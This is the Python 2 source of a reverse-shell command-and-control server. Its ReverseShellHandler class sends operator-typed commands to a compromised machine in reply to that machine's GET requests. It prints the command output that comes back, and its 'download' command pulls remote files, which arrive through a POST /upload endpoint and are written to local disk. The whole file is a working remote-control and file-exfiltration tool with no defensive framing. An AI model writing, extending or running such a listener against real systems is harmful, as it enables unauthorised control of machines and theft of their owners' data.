import sys
import BaseHTTPServer
import base64
import cgi
import os

src_file_path = ''
dst_file_path = ''


def b64e(x):
    return base64.b64encode(x)


def normalize_path_args(args):
    single_quote_token = b64e('SGQT')
    double_quote_token = b64e('DBQT')
    space_token = b64e('SPCT')
    backslash_token = b64e('BKST')
    args = args.replace('\\\'', single_quote_token)
    args = args.replace('\\"', double_quote_token)
    args = args.replace('\\ ', space_token)
    args = args.replace('\\\\', backslash_token)

    args = args.replace('\'', '"')

    index = 0
    arg_list = []
    prev_quote_ret2 = 0
    while index < len(args):
        quote_ret = args.find('"', index)
        space_ret = args.find(' ', index)
        if quote_ret == -1 and space_ret == -1:
            break
        elif quote_ret != -1 and (space_ret == -1 or space_ret != -1 and quote_ret < space_ret):
            quote_ret2 = args.find('"', quote_ret+1)
            if quote_ret2 == -1:
                print "[!] Error: Quote matching failed in normalize_path_args()."
                return []

            arg = args[quote_ret+1: quote_ret2]
            arg = arg.replace (' ', space_token)

            # concat string
            if quote_ret == prev_quote_ret2 + 1:
                arg_list[-1] = arg_list[-1] + arg
            else:
                arg_list.append(arg)

            index = quote_ret2 + 1
            prev_quote_ret2 = quote_ret2
        else:
            arg_list.append(args[index:space_ret])

            index = space_ret+1

    arg_list.extend(args[index:].split(' '))
    if '' in arg_list:
        arg_list = [ x for x in arg_list if x != '']

    for i in range(0, len(arg_list)):
        arg_list[i] = arg_list[i].replace(single_quote_token, '\\\'')
        arg_list[i] = arg_list[i].replace(double_quote_token, '\\"')
        arg_list[i] = arg_list[i].replace(space_token, '\\ ')
        arg_list[i] = arg_list[i].replace(backslash_token, '\\\\')

    return arg_list


class ReverseShellHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    def send_get_response (self, content):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(content)

    def download_file(self, args):
        global src_file_path
        global dst_file_path

        arg_list = normalize_path_args(args)
        arg_num = len(arg_list)
        if arg_num == 0 or arg_num > 2:
            print '[!] Usage: download <src_file_path> [<dst_file_path>]'
            return True
        else:
            src_file_path = arg_list[0]
            if arg_num == 2:
                dst_file_path = arg_list[1]
            else:
                dst_file_path = './'

        print dst_file_path, ' ', src_file_path

        if os.path.isdir(dst_file_path):
            dst_file_path = dst_file_path + src_file_path.replace('\\', '/').split('/')[-1]  # file name

        if os.path.isdir(dst_file_path):
            print '[!] Directory:', dst_file_path, ' already exist, please specify another file name.'
            return True

        if os.path.isfile(dst_file_path):
            print '[!] File:', dst_file_path, ' already exist, please specify another file name.'
            return True

        self.send_get_response('download ' + src_file_path)

        return False

    def do_GET(self):
        need_command = True
        while need_command:
            command = raw_input("#> ")
            command_split = command.split(' ', 1)
            action = command_split[0].lower()
            if len(command_split) == 2:
                args = command_split[1]
            else:
                args = ''

            if 'download' in action:
                need_command = self.download_file(args)
            else:
                self.send_get_response(command)
                need_command = False

    def do_POST(self):
        global src_file_path
        global dst_file_path

        if self.path == '/upload':
            try:
                c_type, _ = cgi.parse_header(self.headers.getheader('content-type'))
                if c_type == 'multipart/form-data':
                    fs = cgi.FieldStorage (fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
                else:
                    print '[!] Unexpected POST request.'
                fs_up = fs['file']
                with open(dst_file_path, 'wb') as f:
                    f.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
                print '[+] '
            except Exception as e:
                print e
            return

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)

        if b64e('REMOTE_FILE_NOT_EXIST') in post_data:
            print '[!] Remote: ', src_file_path, ' does not exist.'
        elif b64e('REMOTE_FILE_IS_A_DIRECTORY') in post_data:
            print '[!] Remote: ', src_file_path, ' is a directory'
        else:
            print post_data


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: ', __file__, ' <host> <port>'
        exit(0)

    sys.argv = sys.argv[1:]
    server = BaseHTTPServer.HTTPServer
    httpd = server((sys.argv[0], int(sys.argv[1])), ReverseShellHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.shutdown()
        print '[!] Server is terminated.'


if __name__ == '__main__':
    main()
